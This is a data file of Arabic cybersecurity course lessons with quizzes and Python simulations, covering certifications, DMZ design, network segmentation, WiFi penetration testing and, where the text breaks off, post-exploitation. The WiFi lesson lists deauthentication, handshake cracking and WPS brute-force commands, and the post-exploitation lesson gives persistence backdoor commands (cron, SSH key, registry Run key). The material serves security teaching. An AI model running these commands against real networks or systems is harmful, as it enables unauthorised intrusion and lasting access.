- شهادات متقدمة
- مساهمة في المجتمع

## الشهادات

### للمبتدئين 🟢
| الشهادة | الجهة | الصعوبة | التكلفة |
|---------|-------|---------|---------|
| CompTIA Security+ | CompTIA | متوسطة | ~$370 |
| eJPT | eLearnSecurity | سهلة | ~$200 |
| CC | (ISC)² | سهلة | مجاني! |

### للمتوسطين 🟡
| الشهادة | الجهة | الصعوبة | التكلفة |
|---------|-------|---------|---------|
| CEH | EC-Council | متوسطة | ~$1000+ |
| PenTest+ | CompTIA | متوسطة | ~$370 |
| eWPT | eLearnSecurity | متوسطة | ~$400 |
| CySA+ | CompTIA | متوسطة | ~$370 |

### للمتقدمين 🔴
| الشهادة | الجهة | الصعوبة | التكلفة |
|---------|-------|---------|---------|
| OSCP | Offensive Security | صعبة | ~$1500 |
| OSEP | Offensive Security | صعبة جداً | ~$1600 |
| GPEN | SANS/GIAC | صعبة | ~$2000+ |
| CISM | ISACA | صعبة | ~$760 |

## موارد التعلم المجانية

### دورات
- Cybrary (مجاني)
- TryHackMe (بعض المحتوى مجاني)
- OWASP WebGoat
- PortSwigger Academy

### كتب
- "The Web Application Hacker's Handbook"
- "Penetration Testing" by Georgia Weidman
- "Hacking: The Art of Exploitation"

### YouTube
- NetworkChuck
- John Hammond
- LiveOverflow
- IppSec

## نصائح للنجاح

### 1. الممارسة > النظرية
- حل CTF يومياً
- ابنِ مختبرك الخاص
- وثّق ما تتعلمه

### 2. ابنِ محفظتك
- GitHub نشط
- مدونة تقنية
- Write-ups لـ CTF

### 3. المجتمع
- Discord/Slack groups
- Twitter #infosec
- مؤتمرات (DEF CON, Black Hat)

### 4. لا تتوقف
- المجال يتطور سريعاً
- تعلم مستمر
- ابقَ فضولياً
`,
    codeExample: `# خارطة طريق تفاعلية
class CyberSecurityRoadmap:
    """
    خارطة طريق لمسيرة الأمن السيبراني
    """
    
    def __init__(self):
        self.skills = {
            "networking": 0,
            "linux": 0,
            "programming": 0,
            "web_security": 0,
            "network_security": 0,
            "cryptography": 0,
            "forensics": 0,
            "pentesting": 0,
        }
        self.certifications = []
        self.experience_months = 0
    
    def assess_level(self):
        """
        تقييم المستوى الحالي
        """
        total = sum(self.skills.values())
        max_total = len(self.skills) * 100
        
        if total < max_total * 0.2:
            return "🌱 مبتدئ"
        elif total < max_total * 0.5:
            return "🌿 متوسط"
        elif total < max_total * 0.8:
            return "🌳 متقدم"
        else:
            return "🏆 خبير"
    
    def get_next_steps(self):
        """
        الخطوات التالية المقترحة
        """
        steps = []
        
        # فحص النواقص
        if self.skills["networking"] < 60:
            steps.append("📚 أكمل دراسة أساسيات الشبكات (CompTIA Network+)")
        
        if self.skills["linux"] < 60:
            steps.append("🐧 تدرب على Linux يومياً (OverTheWire Bandit)")
        
        if self.skills["programming"] < 50:
            steps.append("💻 تعلم Python للأمن (Automate the Boring Stuff)")
        
        if self.skills["web_security"] < 50 and self.skills["networking"] >= 60:
            steps.append("🌐 ابدأ تعلم ثغرات الويب (PortSwigger Academy)")
        
        # شهادات مقترحة
        if not self.certifications and sum(self.skills.values()) > 200:
            steps.append("📜 احصل على شهادة: CompTIA Security+ أو eJPT")
        
        if "Security+" in self.certifications and self.skills["pentesting"] >= 50:
            steps.append("📜 استعد لـ OSCP أو CEH")
        
        return steps
    
    def get_resources(self, skill):
        """
        موارد لتعلم مهارة معينة
        """
        resources = {
            "networking": [
                "📹 Professor Messer - Network+ (YouTube, مجاني)",
                "📚 Computer Networking: A Top-Down Approach",
                "💻 Packet Tracer (محاكاة)",
            ],
            "linux": [
                "🎮 OverTheWire Bandit (wargames)",
                "📹 Linux Journey (linuxjourney.com)",
                "📚 The Linux Command Line (مجاني)",
            ],
            "programming": [
                "📚 Automate the Boring Stuff with Python (مجاني)",
                "💻 HackerRank Python Track",
                "📹 Corey Schafer Python (YouTube)",
            ],
            "web_security": [
                "🎓 PortSwigger Web Security Academy (مجاني!)",
                "📚 OWASP Testing Guide",
                "🎮 DVWA, bWAPP, WebGoat",
            ],
            "pentesting": [
                "🎮 HackTheBox, TryHackMe",
                "📚 Penetration Testing by Georgia Weidman",
                "📹 IppSec YouTube",
            ],
        }
        
        return resources.get(skill, ["لا توجد موارد محددة"])
    
    def print_roadmap(self):
        """
        عرض خارطة الطريق
        """
        print("\\n" + "=" * 60)
        print("  🗺️ خارطة طريق الأمن السيبراني")
        print("=" * 60)
        
        print(f"\\n  المستوى الحالي: {self.assess_level()}")
        
        print("\\n  📊 المهارات:")
        for skill, level in self.skills.items():
            bar_filled = int(level / 10)
            bar_empty = 10 - bar_filled
            bar = "█" * bar_filled + "░" * bar_empty
            print(f"    {skill:<18} [{bar}] {level}%")
        
        print("\\n  📜 الشهادات:")
        if self.certifications:
            for cert in self.certifications:
                print(f"    ✅ {cert}")
        else:
            print("    لا توجد شهادات بعد")
        
        print("\\n  📍 الخطوات التالية:")
        for step in self.get_next_steps():
            print(f"    {step}")
        
        print("\\n  💡 نصيحة اليوم:")
        tips = [
            "حل تحدي CTF واحد على الأقل يومياً",
            "وثّق كل ما تتعلمه في مدونة أو GitHub",
            "انضم لمجتمعات Discord للأمن السيبراني",
            "تابع #infosec على Twitter",
            "شارك في Bug Bounty حتى لو لم تجد شيئاً",
        ]
        import random
        print(f"    '{random.choice(tips)}'")
    
    def simulate_progress(self, months=6):
        """
        محاكاة التقدم على مدى أشهر
        """
        import random
        
        print(f"\\n📈 محاكاة التقدم خلال {months} أشهر...")
        
        for month in range(1, months + 1):
            # تقدم عشوائي
            for skill in self.skills:
                increase = random.randint(5, 15)
                self.skills[skill] = min(100, self.skills[skill] + increase)
            
            self.experience_months += 1
            
            # شهادة بعد فترة
            if month == 3 and not self.certifications:
                self.certifications.append("CompTIA Security+")
                print(f"  🎉 الشهر {month}: حصلت على Security+!")
            
            if month == 6 and len(self.certifications) == 1:
                self.certifications.append("eJPT")
                print(f"  🎉 الشهر {month}: حصلت على eJPT!")
        
        self.print_roadmap()


# تشغيل
roadmap = CyberSecurityRoadmap()

# حالة مبتدئ
roadmap.skills = {
    "networking": 30,
    "linux": 25,
    "programming": 40,
    "web_security": 15,
    "network_security": 20,
    "cryptography": 10,
    "forensics": 5,
    "pentesting": 10,
}

print("\\n📍 الوضع الحالي:")
roadmap.print_roadmap()

print("\\n" + "=" * 60)
print("  📚 موارد تعلم Web Security:")
for resource in roadmap.get_resources("web_security"):
    print(f"    {resource}")`,
    language: 'python',
    xpReward: 100,
    order: 15,
    quiz: {
      question: 'ما أفضل شهادة للمبتدئين في الأمن السيبراني؟',
      options: ['OSCP', 'CISSP', 'CompTIA Security+', 'GPEN'],
      correctAnswer: 2,
      explanation:
        'CompTIA Security+ شهادة أساسية ممتازة للمبتدئين، معترف بها عالمياً وتغطي المفاهيم الأساسية',
    },
  },
];

// ===== دروس إضافية لإكمال cyber-network =====
export const NETWORK_SECURITY_ADVANCED: Lesson[] = [
  {
    id: 'cyber-dmz-architecture',
    courseId: 'cyber-network',
    title: 'DMZ - المنطقة منزوعة السلاح',
    description: 'تصميم شبكات آمنة بطبقات',
    content: `
# DMZ - Demilitarized Zone

## ما هي DMZ؟
منطقة شبكة وسيطة بين الإنترنت والشبكة الداخلية.

## لماذا نحتاجها؟
- عزل الخوادم العامة
- حماية الشبكة الداخلية
- تقليل مساحة الهجوم

## البنية الأساسية

\`\`\`
الإنترنت
    │
    ▼
┌─────────────┐
│ Firewall 1  │  (External)
└─────────────┘
    │
    ▼
┌─────────────┐
│    DMZ      │  Web Server, Mail Server
└─────────────┘
    │
    ▼
┌─────────────┐
│ Firewall 2  │  (Internal)
└─────────────┘
    │
    ▼
┌─────────────┐
│  Internal   │  Database, Users
│  Network    │
└─────────────┘
\`\`\`

## ماذا نضع في DMZ؟
- **Web Servers**: المواقع العامة
- **Mail Servers**: البريد الإلكتروني
- **DNS Servers**: خوادم DNS العامة
- **VPN Gateways**: نقاط دخول VPN
- **Reverse Proxies**: موازنة الأحمال

## ماذا لا نضع في DMZ؟
- ❌ قواعد البيانات الحساسة
- ❌ Active Directory
- ❌ أجهزة المستخدمين
- ❌ خوادم الملفات الداخلية

## قواعد Firewall

### Firewall الخارجي
\`\`\`
# السماح بـ HTTP/HTTPS للـ DMZ
ALLOW Internet → DMZ:80,443

# السماح بـ DNS
ALLOW Internet → DMZ:53

# منع كل شيء آخر
DENY Internet → Internal
\`\`\`

### Firewall الداخلي
\`\`\`
# السماح للـ Web Server بالوصول لقاعدة البيانات
ALLOW DMZ:WebServer → Internal:3306

# منع DMZ من الوصول لبقية الشبكة
DENY DMZ → Internal (default)
\`\`\`

## أنماط DMZ

### Single Firewall (3 interfaces)
- أبسط وأرخص
- نقطة فشل واحدة

### Dual Firewall
- أكثر أماناً
- أغلى وأعقد
- يُفضل من مصنّعين مختلفين
`,
    codeExample: `# محاكاة تصميم DMZ
class DMZArchitecture:
    """
    محاكاة بنية DMZ
    """
    
    def __init__(self):
        self.zones = {
            "internet": {"trust_level": 0, "hosts": ["any"]},
            "dmz": {"trust_level": 50, "hosts": []},
            "internal": {"trust_level": 100, "hosts": []},
        }
        self.firewall_rules = []
    
    def add_server_to_dmz(self, server_name, services):
        """إضافة خادم للـ DMZ"""
        self.zones["dmz"]["hosts"].append({
            "name": server_name,
            "services": services
        })
        print(f"✅ تمت إضافة {server_name} للـ DMZ")
        print(f"   الخدمات: {', '.join(services)}")
    
    def add_firewall_rule(self, source_zone, dest_zone, port, action="ALLOW"):
        """إضافة قاعدة firewall"""
        rule = {
            "source": source_zone,
            "destination": dest_zone,
            "port": port,
            "action": action
        }
        self.firewall_rules.append(rule)
        
        emoji = "✅" if action == "ALLOW" else "❌"
        print(f"{emoji} {action}: {source_zone} → {dest_zone}:{port}")
    
    def check_traffic(self, source, dest, port):
        """فحص إذا كان Traffic مسموح"""
        print(f"\\n🔍 فحص: {source} → {dest}:{port}")
        
        for rule in self.firewall_rules:
            if (rule["source"] == source and 
                rule["destination"] == dest and 
                rule["port"] == port):
                
                if rule["action"] == "ALLOW":
                    print(f"   ✅ مسموح (Rule matched)")
                    return True
                else:
                    print(f"   ❌ ممنوع (Rule matched)")
                    return False
        
        print(f"   ❌ ممنوع (Default deny)")
        return False
    
    def visualize(self):
        """عرض البنية"""
        print("\\n" + "=" * 50)
        print("  🏗️ بنية DMZ")
        print("=" * 50)
        
        print("""
        ┌─────────────────────────────────────┐
        │            INTERNET                 │
        │         (Trust Level: 0)            │
        └─────────────┬───────────────────────┘
                      │
                      ▼
        ┌─────────────────────────────────────┐
        │      🔥 EXTERNAL FIREWALL           │
        └─────────────┬───────────────────────┘
                      │
                      ▼
        ┌─────────────────────────────────────┐
        │              DMZ                    │
        │         (Trust Level: 50)           │""")
        
        for host in self.zones["dmz"]["hosts"]:
            print(f"        │  📦 {host['name']}: {', '.join(host['services'])}")
        
        print("""        └─────────────┬───────────────────────┘
                      │
                      ▼
        ┌─────────────────────────────────────┐
        │      🔥 INTERNAL FIREWALL           │
        └─────────────┬───────────────────────┘
                      │
                      ▼
        ┌─────────────────────────────────────┐
        │         INTERNAL NETWORK            │
        │        (Trust Level: 100)           │
        │  📦 Database, Active Directory      │
        │  💻 User Workstations               │
        └─────────────────────────────────────┘
        """)
    
    def security_audit(self):
        """تدقيق أمني"""
        print("\\n🔒 تدقيق أمني للـ DMZ")
        print("=" * 50)
        
        issues = []
        
        # فحص قواعد خطيرة
        for rule in self.firewall_rules:
            if rule["action"] == "ALLOW":
                # DMZ لا يجب أن يصل للـ Internal بشكل واسع
                if rule["source"] == "dmz" and rule["destination"] == "internal":
                    if rule["port"] == "any":
                        issues.append("🔴 DMZ لديه وصول واسع للشبكة الداخلية!")
                
                # الإنترنت لا يجب أن يصل للـ Internal
                if rule["source"] == "internet" and rule["destination"] == "internal":
                    issues.append("🔴 الإنترنت لديه وصول مباشر للشبكة الداخلية!")
        
        # فحص الخوادم في DMZ
        for host in self.zones["dmz"]["hosts"]:
            if "database" in host["name"].lower():
                issues.append(f"🟡 قاعدة بيانات في DMZ: {host['name']}")
        
        if issues:
            print("\\n  مشاكل مكتشفة:")
            for issue in issues:
                print(f"    {issue}")
        else:
            print("\\n  ✅ لم يُعثر على مشاكل واضحة")
        
        return issues


# تشغيل المحاكاة
dmz = DMZArchitecture()

# إضافة خوادم للـ DMZ
dmz.add_server_to_dmz("web-server", ["HTTP:80", "HTTPS:443"])
dmz.add_server_to_dmz("mail-server", ["SMTP:25", "IMAP:993"])

# إضافة قواعد Firewall
print("\\n📋 إعداد قواعد Firewall:")
dmz.add_firewall_rule("internet", "dmz", "80")
dmz.add_firewall_rule("internet", "dmz", "443")
dmz.add_firewall_rule("dmz", "internal", "3306")  # للـ Database
dmz.add_firewall_rule("internet", "internal", "any", "DENY")

# عرض البنية
dmz.visualize()

# فحص traffic
dmz.check_traffic("internet", "dmz", "443")
dmz.check_traffic("internet", "internal", "22")
dmz.check_traffic("dmz", "internal", "3306")

# تدقيق أمني
dmz.security_audit()`,
    language: 'python',
    xpReward: 140,
    order: 8,
    quiz: {
      question: 'ماذا نضع في منطقة DMZ؟',
      options: [
        'قواعد البيانات الحساسة',
        'أجهزة المستخدمين',
        'خوادم الويب العامة',
        'Active Directory',
      ],
      correctAnswer: 2,
      explanation:
        'DMZ للخوادم التي تحتاج وصول من الإنترنت مثل Web Servers، بينما البيانات الحساسة تبقى في الشبكة الداخلية',
    },
  },
  {
    id: 'cyber-network-segmentation',
    courseId: 'cyber-network',
    title: 'تقسيم الشبكات (Network Segmentation)',
    description: 'فصل الشبكة لطبقات أمنية',
    content: `
# Network Segmentation

## ما هو؟
تقسيم الشبكة الكبيرة لشبكات أصغر معزولة.

## لماذا؟
- **الأمان**: المهاجم لا يصل لكل شيء
- **الأداء**: تقليل الـ Broadcast
- **الامتثال**: فصل البيانات الحساسة
- **الإدارة**: سهولة التحكم

## طرق التقسيم

### VLANs (Virtual LANs)
\`\`\`
VLAN 10: الإدارة
VLAN 20: المحاسبة
VLAN 30: المطورين
VLAN 40: الضيوف
\`\`\`

### Subnets
\`\`\`
192.168.10.0/24 - الإدارة
192.168.20.0/24 - المحاسبة
192.168.30.0/24 - المطورين
192.168.40.0/24 - الضيوف
\`\`\`

### Micro-segmentation
- تقسيم دقيق جداً
- حتى مستوى التطبيقات
- Zero Trust

## أفضل الممارسات

### 1. فصل حسب الوظيفة
- المستخدمين
- الخوادم
- الأجهزة IoT
- الضيوف

### 2. فصل حسب الحساسية
- البيانات السرية
- البيانات العادية
- البيانات العامة

### 3. Least Privilege
- السماح بما هو ضروري فقط
- Default Deny

## مثال عملي

\`\`\`
┌─────────────────────────────────────────────┐
│              Core Switch                     │
├─────────────┬─────────────┬─────────────────┤
│   VLAN 10   │   VLAN 20   │    VLAN 30      │
│   Servers   │    Users    │    Guests       │
│             │             │                 │
│ 10.0.10.0/24│ 10.0.20.0/24│  10.0.30.0/24  │
└─────────────┴─────────────┴─────────────────┘

القواعد:
- VLAN 20 → VLAN 10: فقط HTTP/HTTPS
- VLAN 30 → الإنترنت فقط
- VLAN 30 ✗ VLAN 10, 20
\`\`\`
`,
    codeExample: `# محاكاة تقسيم الشبكات
from dataclasses import dataclass
from typing import List, Dict

@dataclass
class VLAN:
    id: int
    name: str
    subnet: str
    security_level: int
    hosts: List[str]

class NetworkSegmentation:
    """
    محاكاة تقسيم الشبكات
    """
    
    def __init__(self):
        self.vlans: Dict[int, VLAN] = {}
        self.acl_rules = []
    
    def create_vlan(self, vlan_id, name, subnet, security_level):
        """إنشاء VLAN"""
        self.vlans[vlan_id] = VLAN(
            id=vlan_id,
            name=name,
            subnet=subnet,
            security_level=security_level,
            hosts=[]
        )
        print(f"✅ VLAN {vlan_id} ({name}) created: {subnet}")
    
    def add_host(self, vlan_id, hostname, ip):
        """إضافة جهاز لـ VLAN"""
        if vlan_id in self.vlans:
            self.vlans[vlan_id].hosts.append({"name": hostname, "ip": ip})
            print(f"  📦 {hostname} ({ip}) → VLAN {vlan_id}")
    
    def add_acl(self, src_vlan, dst_vlan, ports, action="ALLOW"):
        """إضافة قاعدة ACL"""
        self.acl_rules.append({
            "src": src_vlan,
            "dst": dst_vlan,
            "ports": ports,
            "action": action
        })
        
        ports_str = ", ".join(map(str, ports)) if ports else "ALL"
        emoji = "✅" if action == "ALLOW" else "❌"
        print(f"{emoji} ACL: VLAN{src_vlan} → VLAN{dst_vlan} [{ports_str}]")
    
    def check_communication(self, src_vlan, dst_vlan, port):
        """فحص إمكانية الاتصال"""
        print(f"\\n🔍 Check: VLAN{src_vlan} → VLAN{dst_vlan}:{port}")
        
        # نفس الـ VLAN
        if src_vlan == dst_vlan:
            print("  ✅ Same VLAN - Allowed")
            return True
        
        # فحص ACL
        for rule in self.acl_rules:
            if rule["src"] == src_vlan and rule["dst"] == dst_vlan:
                if rule["action"] == "DENY":
                    print(f"  ❌ Blocked by ACL")
                    return False
                if port in rule["ports"] or not rule["ports"]:
                    print(f"  ✅ Allowed by ACL")
                    return True
        
        print("  ❌ Default Deny")
        return False
    
    def visualize(self):
        """عرض الشبكة"""
        print("\\n" + "=" * 60)
        print("  🌐 Network Segmentation Map")
        print("=" * 60)
        
        # ترتيب حسب Security Level
        sorted_vlans = sorted(self.vlans.values(), 
                             key=lambda v: v.security_level, 
                             reverse=True)
        
        for vlan in sorted_vlans:
            sec_bar = "🔒" * (vlan.security_level // 20)
            print(f"""
┌{'─' * 50}┐
│ VLAN {vlan.id}: {vlan.name:<20} Security: {sec_bar:<10}
│ Subnet: {vlan.subnet:<40}
│ Hosts:""")
            for host in vlan.hosts:
                print(f"│   • {host['name']:<15} {host['ip']}")
            print(f"└{'─' * 50}┘")
    
    def security_assessment(self):
        """تقييم أمني"""
        print("\\n🔒 Security Assessment")
        print("=" * 60)
        
        findings = []
        
        # فحص VLANs بدون ACL
        vlan_ids = set(self.vlans.keys())
        protected_vlans = set()
        
        for rule in self.acl_rules:
            protected_vlans.add(rule["dst"])
        
        unprotected = vlan_ids - protected_vlans
        if unprotected:
            for v in unprotected:
                findings.append(f"⚠️ VLAN {v} ({self.vlans[v].name}) has no inbound ACLs")
        
        # فحص Guest VLAN
        for vlan in self.vlans.values():
            if "guest" in vlan.name.lower():
                # هل Guest معزول؟
                can_reach_internal = False
                for rule in self.acl_rules:
                    if rule["src"] == vlan.id and rule["action"] == "ALLOW":
                        if self.vlans[rule["dst"]].security_level > 50:
                            can_reach_internal = True
                            findings.append(
                                f"🔴 Guest VLAN can reach high-security VLAN {rule['dst']}"
                            )
                
                if not can_reach_internal:
                    print(f"  ✅ Guest VLAN {vlan.id} properly isolated")
        
        if findings:
            print("\\n  Issues Found:")
            for f in findings:
                print(f"    {f}")
        else:
            print("\\n  ✅ No major issues found")
        
        return findings
    
    def generate_config(self):
        """توليد Config تقريبي"""
        print("\\n📝 Sample Switch Configuration")
        print("=" * 60)
        
        config = []
        config.append("! VLAN Configuration")
        
        for vlan in self.vlans.values():
            config.append(f"vlan {vlan.id}")
            config.append(f"  name {vlan.name}")
        
        config.append("")
        config.append("! ACL Configuration")
        
        for i, rule in enumerate(self.acl_rules, 1):
            action = "permit" if rule["action"] == "ALLOW" else "deny"
            ports = ",".join(map(str, rule["ports"])) if rule["ports"] else "any"
            config.append(
                f"access-list {i} {action} vlan{rule['src']} vlan{rule['dst']} eq {ports}"
            )
        
        print("\\n".join(config))


# ===== تشغيل المحاكاة =====
net = NetworkSegmentation()

# إنشاء VLANs
print("📌 Creating VLANs...")
net.create_vlan(10, "Servers", "10.0.10.0/24", 100)
net.create_vlan(20, "Finance", "10.0.20.0/24", 80)
net.create_vlan(30, "Users", "10.0.30.0/24", 60)
net.create_vlan(40, "Guests", "10.0.40.0/24", 20)

# إضافة أجهزة
print("\\n📦 Adding Hosts...")
net.add_host(10, "web-server", "10.0.10.10")
net.add_host(10, "db-server", "10.0.10.20")
net.add_host(20, "finance-pc1", "10.0.20.10")
net.add_host(30, "user-pc1", "10.0.30.10")
net.add_host(40, "guest-laptop", "10.0.40.10")

# إضافة ACLs
print("\\n🔒 Adding ACL Rules...")
net.add_acl(30, 10, [80, 443])  # Users → Servers (Web only)
net.add_acl(20, 10, [80, 443, 3306])  # Finance → Servers (Web + DB)
net.add_acl(40, 10, [], "DENY")  # Guests ✗ Servers
net.add_acl(40, 20, [], "DENY")  # Guests ✗ Finance
net.add_acl(40, 30, [], "DENY")  # Guests ✗ Users

# عرض الشبكة
net.visualize()

# فحص الاتصالات
net.check_communication(30, 10, 80)   # User → Server:HTTP
net.check_communication(40, 10, 80)   # Guest → Server (blocked)
net.check_communication(20, 10, 3306) # Finance → DB

# تقييم أمني
net.security_assessment()`,
    language: 'python',
    xpReward: 150,
    order: 9,
    quiz: {
      question: 'ما فائدة تقسيم الشبكة لـ VLANs؟',
      options: [
        'زيادة سرعة الإنترنت',
        'الحد من انتشار الهجمات',
        'تقليل تكلفة الأجهزة',
        'زيادة عدد المستخدمين',
      ],
      correctAnswer: 1,
      explanation:
        'تقسيم الشبكة يمنع المهاجم من الوصول لكل أجزاء الشبكة إذا اخترق جزءاً واحداً',
    },
  },
];

// ===== دروس إضافية لإكمال cyber-ethical-hacking =====
export const ETHICAL_HACKING_COMPLETE: Lesson[] = [
  {
    id: 'ethical-wireless-hacking',
    courseId: 'cyber-ethical-hacking',
    title: 'اختبار اختراق الشبكات اللاسلكية',
    description: 'تقنيات فحص أمان WiFi',
    content: `
# اختبار اختراق WiFi

⚠️ **تحذير قانوني**: فقط على شبكاتك أو بإذن مكتوب!

## المتطلبات
- بطاقة WiFi تدعم Monitor Mode
- Kali Linux أو توزيعة مشابهة
- إذن كتابي

## مراحل الاختبار

### 1. الاستطلاع
\`\`\`bash
# تفعيل Monitor Mode
airmon-ng start wlan0

# مسح الشبكات
airodump-ng wlan0mon
\`\`\`

### 2. التقاط Handshake
\`\`\`bash
# استهداف شبكة محددة
airodump-ng -c [channel] --bssid [MAC] -w capture wlan0mon

# إجبار على إعادة الاتصال (deauth)
aireplay-ng -0 5 -a [AP_MAC] -c [Client_MAC] wlan0mon
\`\`\`

### 3. كسر كلمة المرور
\`\`\`bash
# Dictionary Attack
aircrack-ng -w wordlist.txt capture-01.cap

# باستخدام hashcat (أسرع)
hashcat -m 22000 hash.hc22000 wordlist.txt
\`\`\`

## الهجمات الشائعة

### WPA/WPA2 PSK
- التقاط 4-way handshake
- Brute force / Dictionary

### WPS Attack
\`\`\`bash
# فحص WPS
wash -i wlan0mon

# هجوم PIN
reaver -i wlan0mon -b [BSSID] -vv
\`\`\`

### Evil Twin
- إنشاء نقطة وصول مزيفة
- التقاط كلمات المرور

### PMKID Attack
- لا يحتاج client متصل
- أسرع من handshake
\`\`\`bash
hcxdumptool -i wlan0mon -o capture.pcapng
\`\`\`

## الحماية المقترحة
- WPA3 إن توفر
- كلمة مرور قوية (15+ حرف)
- تعطيل WPS
- MAC filtering (محدود)
- مراقبة الأجهزة المتصلة
`,
    codeExample: `# أدوات فحص WiFi للتعليم
import hashlib
import itertools
import string

class WiFiPentestDemo:
    """
    محاكاة اختبار اختراق WiFi للتعليم
    ⚠️ للأغراض التعليمية فقط!
    """
    
    def __init__(self):
        self.captured_handshake = None
        self.target_network = None
    
    def simulate_scan(self):
        """محاكاة مسح الشبكات"""
        print("\\n📡 Scanning for WiFi Networks...")
        print("=" * 70)
        print(f"{'BSSID':<20} {'CH':<5} {'ENC':<8} {'PWR':<6} {'ESSID'}")
        print("-" * 70)
        
        networks = [
            ("AA:BB:CC:DD:EE:01", 6, "WPA2", -45, "Home_Network"),
            ("AA:BB:CC:DD:EE:02", 1, "WPA2", -60, "Office_WiFi"),
            ("AA:BB:CC:DD:EE:03", 11, "WEP", -70, "Old_Router"),
            ("AA:BB:CC:DD:EE:04", 6, "WPA3", -55, "Secure_Net"),
            ("AA:BB:CC:DD:EE:05", 1, "OPEN", -40, "Free_WiFi"),
        ]
        
        for net in networks:
            security_color = ""
            if net[2] == "WEP":
                security_color = "🔴"
            elif net[2] == "OPEN":
                security_color = "🔴🔴"
            elif net[2] == "WPA2":
                security_color = "🟡"
            else:
                security_color = "🟢"
            
            print(f"{net[0]:<20} {net[1]:<5} {net[2]:<8} {net[3]:<6} {net[4]} {security_color}")
        
        print("\\n💡 Analysis:")
        print("  🔴 Old_Router uses WEP - easily crackable!")
        print("  🔴🔴 Free_WiFi is OPEN - no encryption!")
        print("  🟢 Secure_Net uses WPA3 - most secure")
        
        return networks
    
    def simulate_handshake_capture(self, target_bssid):
        """محاكاة التقاط handshake"""
        print(f"\\n🎯 Targeting: {target_bssid}")
        print("=" * 50)
        
        print("\\n[1] Setting channel...")
        print("    ✅ Channel set to 6")
        
        print("\\n[2] Waiting for handshake...")
        print("    📡 Listening for clients...")
        print("    👤 Client detected: 11:22:33:44:55:66")
        
        print("\\n[3] Sending deauth packets...")
        print("    ⚡ Deauth sent to client")
        print("    📥 Client reconnecting...")
        
        print("\\n[4] Capturing 4-way handshake...")
        print("    ✅ EAPOL 1/4 captured")
        print("    ✅ EAPOL 2/4 captured")
        print("    ✅ EAPOL 3/4 captured")
        print("    ✅ EAPOL 4/4 captured")
        
        print("\\n🎉 Handshake captured successfully!")
        
        # محاكاة handshake (ليس حقيقي)
        self.captured_handshake = {
            "bssid": target_bssid,
            "essid": "Target_Network",
            "pmk_hash": hashlib.sha256(b"simulated_pmk").hexdigest()
        }
        
        return self.captured_handshake
    
    def simulate_password_crack(self, wordlist):
        """محاكاة كسر كلمة المرور"""
        if not self.captured_handshake:
            print("❌ No handshake captured!")
            return None
        
        print(f"\\n🔓 Starting password crack...")
        print(f"   Wordlist: {len(wordlist)} passwords")
        print("=" * 50)
        
        # كلمة المرور "المخفية" للمحاكاة
        actual_password = "MyWiFi123"
        
        for i, password in enumerate(wordlist, 1):
            # محاكاة التقدم
            if i % 1000 == 0:
                print(f"   Tried {i} passwords...")
            
            if password == actual_password:
                print(f"\\n🎉 PASSWORD FOUND!")
                print(f"   Password: {password}")
                print(f"   Attempts: {i}")
                return password
        
        print("\\n❌ Password not in wordlist")
        return None
    
    def generate_wordlist(self, pattern="common"):
        """توليد wordlist للاختبار"""
        wordlists = {
            "common": [
                "password", "123456", "12345678", "qwerty",
                "admin", "letmein", "welcome", "monkey",
                "MyWiFi123",  # الكلمة الصحيحة
                "password123", "wifi2024", "homewifi"
            ],
            "numeric": [str(i).zfill(8) for i in range(10000)],
        }
        
        return wordlists.get(pattern, wordlists["common"])
    
    def wps_attack_simulation(self, target_bssid):
        """محاكاة هجوم WPS"""
        print(f"\\n🔓 WPS Attack Simulation")
        print("=" * 50)
        print(f"Target: {target_bssid}")
        
        print("\\n[1] Checking WPS status...")
        print("    ✅ WPS Enabled")
        print("    ⚠️ WPS Locked: No")
        
        print("\\n[2] Starting PIN bruteforce...")
        print("    PIN format: XXXX-XXX (+ checksum)")
        print("    Total combinations: 11,000")
        
        # محاكاة تقدم
        pins_tried = [
            ("12345670", "❌"),
            ("00005670", "❌"),
            ("01234560", "❌"),
            ("98765430", "✅"),  # "النجاح"
        ]
        
        for pin, status in pins_tried:
            print(f"    Trying PIN: {pin} {status}")
        
        print("\\n🎉 WPS PIN Found: 98765430")
        print("🔑 WiFi Password: SuperSecret123")
        
        print("\\n⚠️ Mitigation:")
        print("   - Disable WPS in router settings")
        print("   - Use WPA3 if available")
    
    def security_recommendations(self):
        """توصيات أمنية"""
        print("\\n" + "=" * 60)
        print("  🛡️ WiFi Security Recommendations")
        print("=" * 60)
        
        recommendations = [
            ("Use WPA3", "Most secure protocol available"),
            ("Strong Password", "15+ characters, mixed case, numbers, symbols"),
            ("Disable WPS", "WPS is vulnerable to PIN attacks"),
            ("Change Default SSID", "Don't reveal router brand"),
            ("MAC Filtering", "Limited protection, but adds layer"),
            ("Regular Updates", "Keep router firmware updated"),
            ("Guest Network", "Isolate guests from main network"),
            ("Monitor Devices", "Check for unknown connected devices"),
        ]
        
        for rec, desc in recommendations:
            print(f"\\n  ✅ {rec}")
            print(f"     {desc}")


# تشغيل المحاكاة
demo = WiFiPentestDemo()

# مسح الشبكات
networks = demo.simulate_scan()

# التقاط handshake
demo.simulate_handshake_capture("AA:BB:CC:DD:EE:01")

# كسر كلمة المرور
wordlist = demo.generate_wordlist("common")
demo.simulate_password_crack(wordlist)

# هجوم WPS
demo.wps_attack_simulation("AA:BB:CC:DD:EE:02")

# التوصيات
demo.security_recommendations()`,
    language: 'python',
    xpReward: 180,
    order: 11,
    quiz: {
      question: 'ما المطلوب لكسر WPA2-PSK؟',
      options: [
        'معرفة SSID فقط',
        'التقاط 4-way handshake',
        'عنوان MAC فقط',
        'الوصول الفيزيائي للراوتر',
      ],
      correctAnswer: 1,
      explanation:
        'يجب التقاط 4-way handshake بين نقطة الوصول والعميل، ثم تجربة كلمات المرور offline',
    },
  },
  {
    id: 'ethical-post-exploitation',
    courseId: 'cyber-ethical-hacking',
    title: 'ما بعد الاختراق (Post-Exploitation)',
    description: 'ماذا يفعل المخترق بعد الدخول',
    content: `
# Post-Exploitation

## ما هو؟
الخطوات بعد الحصول على وصول مبدئي للنظام.

## الأهداف
1. **الثبات**: البقاء في النظام
2. **رفع الصلاحيات**: الحصول على root/admin
3. **الاستطلاع الداخلي**: معرفة المزيد
4. **التحرك الجانبي**: الوصول لأنظمة أخرى
5. **جمع البيانات**: الهدف النهائي

## 1. الثبات (Persistence)

### Linux
\`\`\`bash
# Cron job
echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab

# SSH keys
echo "attacker_pubkey" >> ~/.ssh/authorized_keys

# Systemd service
\`\`\`

### Windows
\`\`\`powershell
# Registry Run key
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d "C:\\backdoor.exe"

# Scheduled Task
